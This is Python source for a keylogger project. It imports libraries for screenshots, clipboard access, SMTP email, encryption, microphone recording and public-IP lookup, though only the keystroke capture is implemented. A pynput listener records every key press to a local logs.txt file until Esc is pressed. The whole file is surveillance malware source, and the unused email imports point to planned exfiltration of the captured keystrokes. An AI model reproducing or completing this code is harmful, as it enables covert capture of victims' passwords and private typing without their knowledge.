# Libraries / Dependicies

# Modules to collect Computer Information
import socket
import platform

# Modules to collect screenshots
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Modules to collect Clipboard
#import win32clipboard
import clipboard



# Modules to collect Key Stroke
from pynput.keyboard import *

# Modules for email functionality
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Modules to encrypt files
from cryptography.fernet import Fernet

# Modules to collect time and OS information 
import time 
import os

# Modules to get username information
import getpass
from requests import get

# Modules to collect audio/ to use Microphone
from scipy.io.wavfile import write
import sounddevice as soundDeviceObject

# Will come back to this
keysInformation = "logs.txt"
filePath = "/Users/kayvee/Code/KeyLogger/PythonKeyLogger"

totalKeys = 0
keys =[]




def key_is_pressed(Key):
	global totalKeys,keys

	print(Key)
	keys.append(Key)
	totalKeys += 1
	
	if totalKeys >= 1:
		totalKeys = 0
		write_keys_on_file(keys)
		keys=[]


def write_keys_on_file(keys):
	with open(filePath + "/"+keysInformation,"a") as f:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				f.write("\n")
				f.close()
			elif k.find("Key") == -1:
				f.write(k)
				f.close()



def key_is_released(key):
	if key == Key.esc:
		return False


with Listener(on_press = key_is_pressed, on_release = key_is_released) as listener:
	listener.join()

	



















